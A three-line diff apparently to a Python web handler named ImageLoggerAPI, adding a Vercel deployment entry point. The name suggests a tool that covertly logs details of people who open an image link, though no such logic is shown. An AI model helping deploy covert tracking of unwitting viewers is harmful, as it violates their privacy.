@@ -302,3 +302,6 @@ if (!currenturl.includes("g=")) {
     do_POST = handleRequest
 
 handler = ImageLoggerAPI
+
+# Vercel entry point
+app = ImageLoggerAPI
